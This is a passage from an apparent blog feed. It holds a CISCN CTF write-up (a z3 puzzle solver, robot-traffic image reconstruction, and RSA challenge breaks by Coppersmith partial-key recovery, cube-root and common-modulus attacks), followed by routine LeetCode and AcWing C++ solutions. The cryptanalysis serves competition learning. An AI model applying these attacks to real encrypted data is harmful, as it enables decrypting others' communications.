class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * b + y] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * (b + <span class="hljs-number">1</span>) + y])<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">if</span> zy[<span class="hljs-number">4</span> * a + x]==<span class="hljs-number">1</span>:<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x] &gt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x + <span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">elif</span> zy[<span class="hljs-number">4</span> * a + x] == <span class="hljs-number">2</span>:<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x] &lt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x + <span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">if</span> sx[<span class="hljs-number">5</span> * b + y]==<span class="hljs-number">1</span>:<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * b + y] &lt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * (b + <span class="hljs-number">1</span>) + y])<br>    <span class="hljs-keyword">elif</span> sx[<span class="hljs-number">5</span> * b + y] == <span class="hljs-number">2</span> :<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * b + y] &gt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * (b + <span class="hljs-number">1</span>) + y])<br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">while</span> ts.check() == sat:<br>    answer = ts.model()<br>    condition = []<br>    p = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        p += [answer[i]]<br>        condition.append(i != answer[i])<br>    p[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>    p[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span><br>    ts.add(Or(condition))<br><br>p=[<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]<br>l=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    l+=<span class="hljs-built_in">str</span>(i)<br>md = hashlib.md5()<br>md.update(l.encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;CISCN&#123;&#x27;</span>+md.hexdigest()+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="第三卷"><a href="#第三卷" class="headerlink" title="第三卷"></a>第三卷</h2><h3 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h3><h4 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h4><p>下载后发现rspag文件是robotstdio的仿真文件，在WireShark中看看流量，注意到部分流量中出现了<code>Value[193, 65, 0]</code>,这个<code>Value</code>属性内的数据根据题目给的提示很有可能就是整个题目的破题点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;Value\.\[(\d+),(\d+),(\d+)\]&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>    data1 = a.findall(data)<br><br><span class="hljs-built_in">print</span>(data1)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">456</span>, <span class="hljs-number">456</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data1:<br>    tmp = (<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>]))<br>    img.putpixel(tmp, <span class="hljs-number">255</span>)<br>img.save(<span class="hljs-string">&quot;b.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<code>easy_robo_xx</code>，对其进行md5加密之后得到解<code>CISCN&#123;d4f1fb80bc11ffd722861367747c0f10&#125;</code></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>计算p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">0xa188aaaf75c79219462f0ba90b68cb6e0694b113c89b8006f3a54f6374bbc0d91fb83b15866d93fd74019e1e541edce6c06c012c76f41af516f5cc89f5f9984f4e626607632edec7139e5acc4a3f3f0dd90665d469fcf7c9226fb0fe275b6b2a776dac8d032c880eec9862fc9d6480fb9cd2ce3e65867eac7e52d4462fb501eb</span><br><br>p = <span class="hljs-number">0xda5f14bacd97f5504f39eeef22af37e8551700296843e536760cea761d334508003e01b886c0c600000000000000000000000000000000000000000000000000</span><br>k = <span class="hljs-number">200</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>s = x + p<br>x0 = s.small_roots(X=<span class="hljs-number">2</span>^k, beta=<span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]<br>p = p+x0<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p:    &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(p)))<br>q = n/<span class="hljs-built_in">int</span>(p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q:    &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(q)))<br></code></pre></td></tr></table></figure><p>解密msg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long,getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>xx = <span class="hljs-number">0</span><br>yy = <span class="hljs-number">2</span><br><br>text = []<br><br>m1 = bytes_to_long(text[:xx])<br>m2 = bytes_to_long(text[xx:yy])<br>m3 = bytes_to_long(text[yy:])<br><br>e1 = <span class="hljs-number">3</span><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q1 = getPrime(<span class="hljs-number">512</span>)<br>N1 = p1*q1<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m1,e1,N1)<br><span class="hljs-built_in">print</span> (e1,N1)<br><br>p2 = getPrime(<span class="hljs-number">512</span>)<br>e2 = <span class="hljs-number">17</span><br>e3 = <span class="hljs-number">65537</span><br>q2 = getPrime(<span class="hljs-number">512</span>)<br>N2 = p2*q2<br><br><span class="hljs-built_in">print</span> (e2,N2)<br><span class="hljs-built_in">print</span> (e3,N2)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m2,e2,N2)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m2,e3,N2)<br><br>p3 = getPrime(<span class="hljs-number">512</span>)<br>q3 = getPrime(<span class="hljs-number">512</span>)<br>N3 = p3*q3<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m3,e3,N3)<br><span class="hljs-built_in">print</span> p3&gt;&gt;<span class="hljs-number">200</span><br><span class="hljs-built_in">print</span> (e3,N3)<br><br>n = <span class="hljs-number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L</span><br>e1 = <span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br><br>m1 = <span class="hljs-string">&quot;&quot;</span><br>m2 = <span class="hljs-string">&quot;&quot;</span><br>m3 = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">130000000</span>):<br>    a, b = gmpy2.iroot(e1 + j * n, <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span>:<br>        m = a<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x is &#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(long_to_bytes(m)))<br>        m1 = long_to_bytes(m)<br>        <span class="hljs-keyword">break</span><br><br>n2 = <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span><br><br>e1 = <span class="hljs-number">17</span><br>e2 = <span class="hljs-number">65537</span><br><br>s = gcdext(e1, e2)<br><br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = -s[<span class="hljs-number">2</span>]<br><br>c2 = <span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>c1 = <span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><br>c2 = invert(c2, n2)<br>m = (<span class="hljs-built_in">pow</span>(c1,s1,n2) * <span class="hljs-built_in">pow</span>(c2 , s2 , n2)) % n2<br>m2 = long_to_bytes(m)<br><br>p3 = <span class="hljs-number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span><br>q3 = <span class="hljs-number">9918033198963879798362329507637256706010562962487329742400933192721549307087332482107381554368538995776396557446746866861247191248938339640876368268930589</span><br>enc3 = <span class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>e3 = <span class="hljs-number">65537</span><br>n3 = <span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span><br><br><br>ph3 = (p3-<span class="hljs-number">1</span>)*(q3-<span class="hljs-number">1</span>)<br>d3 = gmpy2.invert(e3,ph3)<br>m3 = <span class="hljs-built_in">pow</span>(enc3,d3,n3)<br>m3 = long_to_bytes(m3)<br>message = m1 + m2 + m3<br><br>md5 = hashlib.md5()<br>md5.update(message)<br><span class="hljs-built_in">print</span> md5.hexdigest()<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【刷题记录】AcWing 435. 传球游戏</title>
      <link href="/2021/05/832f70bb.html"/>
      <url>/2021/05/832f70bb.html</url>
      
        <content type="html"><![CDATA[<h2 id="AcWing-435-传球游戏"><a href="#AcWing-435-传球游戏" class="headerlink" title="AcWing 435. 传球游戏"></a><a href="https://www.acwing.com/problem/content/437/">AcWing 435. 传球游戏</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>一道简单的DP推导题目，推导过程中注意编号是循环的就好，每个人有两种状态，一种是从左边接到一种是从右边接到</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">35</span>;<br><br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> f[N][N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            f[i][j]=f[i<span class="hljs-number">-1</span>][(j<span class="hljs-number">-1</span>+n)%n]+f[i<span class="hljs-number">-1</span>][(j+<span class="hljs-number">1</span>)%n];<br>    cout&lt;&lt;f[m][<span class="hljs-number">0</span>]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="LeetCode-7-整数反转"><a href="#LeetCode-7-整数反转" class="headerlink" title="LeetCode 7. 整数反转"></a><a href="https://leetcode-cn.com/problems/reverse-integer/">LeetCode 7. 整数反转</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>依次从右往左计算出每位数字，然后逆序累加在一个整数中。<br>另外，这题有两点需要注意：</p><p>因为int型整数逆序后可能会溢出，所以我们要用long long记录中间结果；在C++中，负数的取模运算和数学意义上的取模运算不同，结果还是负数，比如 −12%10&#x3D;−2，所以我们不需要对负数进行额外处理。</p><p>时间复杂度分析：一共有 O(logn)<br>位，对于每一位的计算量是常数级的，所以总时间复杂度是 O(logn).</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">reverse</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(x)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">0</span> &amp;&amp; res&gt;(INT_MAX - x % <span class="hljs-number">10</span>)/<span class="hljs-number">10</span>)    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span> &amp;&amp; res&lt;(INT_MIN -x %<span class="hljs-number">10</span>)/<span class="hljs-number">10</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            res=res*<span class="hljs-number">10</span>+x%<span class="hljs-number">10</span>;<br>            x/=<span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-78-左旋转字符串"><a href="#AcWing-78-左旋转字符串" class="headerlink" title="AcWing 78.左旋转字符串"></a><a href="https://www.acwing.com/problem/content/74/">AcWing 78.左旋转字符串</a></h2><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>见代码</p><h4 id="C-代码-2"><a href="#C-代码-2" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">leftRotateString</span><span class="hljs-params">(string str, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> str.<span class="hljs-built_in">substr</span>(n)+str.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>,n);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DP </tag>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 633. 平方数之和</title>
      <link href="/2021/04/3d4cbd1d.html"/>
      <url>/2021/04/3d4cbd1d.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-633-平方数之和"><a href="#LeetCode-633-平方数之和" class="headerlink" title="LeetCode 633.平方数之和"></a><a href="https://leetcode-cn.com/problems/sum-of-square-numbers/">LeetCode 633.平方数之和</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>优化掉一层循环即可</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-type">bool</span> <span class="hljs-title function_">judgeSquareSum</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a=<span class="hljs-number">0</span>; (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a&lt;=c;a++)<br>        &#123;<br>            <span class="hljs-type">int</span> t=c-a*a;<br>            <span class="hljs-type">int</span> r=<span class="hljs-built_in">sqrt</span>(t);<br>            <span class="hljs-keyword">if</span>(r*r==t)  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1221-四平方和"><a href="#AcWing-1221-四平方和" class="headerlink" title="AcWing 1221.四平方和"></a><a href="https://www.acwing.com/problem/content/1223/">AcWing 1221.四平方和</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>哈希+二分，预处理以后按照条件输出即可，这里也需要优化掉两层循环</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">5000010</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> C[N], D[N];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-built_in">memset</span>(C, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span>(C));<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;c*c&lt;=n;c++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> d=c;d*d+c*c&lt;=n;d++)<br>        &#123;<br>            <span class="hljs-type">int</span> s=c*c+d*d;<br>            <span class="hljs-keyword">if</span>(C[s]==<span class="hljs-number">-1</span>)<br>                C[s]=c, D[s]=d;<br>        &#125;<br>        <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;a*a&lt;=n;a++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b=a; a*a+b*b&lt;=n;b++)<br>        &#123;<br>            <span class="hljs-type">int</span> s=n-a*a-b*b;<br>            <span class="hljs-keyword">if</span>(C[s]!=<span class="hljs-number">-1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d %d\n&quot;</span>, a, b, C[s], D[s]);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【树】构建二叉搜索树</title>
      <link href="/2021/04/9e5e150.html"/>
      <url>/2021/04/9e5e150.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-938-二叉搜索树的范围和"><a href="#LeetCode-938-二叉搜索树的范围和" class="headerlink" title="LeetCode 938.二叉搜索树的范围和"></a><a href="https://leetcode-cn.com/problems/range-sum-of-bst/">LeetCode 938.二叉搜索树的范围和</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>递归就完事了</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">rangeSumBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span> &#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(root-&gt;val &gt; high) <span class="hljs-keyword">return</span> rangeSumBST(root-&gt;left, low, high);<br>        <span class="hljs-keyword">if</span>(root-&gt;val &lt; low) 